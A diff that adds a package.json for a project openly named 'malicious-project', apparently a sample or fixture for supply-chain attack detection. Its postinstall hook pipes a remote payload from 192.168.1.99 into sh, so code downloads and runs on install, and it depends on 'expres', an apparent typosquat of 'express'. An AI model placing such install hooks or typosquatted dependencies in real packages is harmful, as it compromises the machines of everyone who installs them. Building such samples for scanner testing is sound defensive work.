@@ -1,0 +1,10 @@
+{
+  "name": "malicious-project",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl http://192.168.1.99/payload | sh"
+  },
+  "dependencies": {
+    "expres": "^4.0.0"
+  }
+}
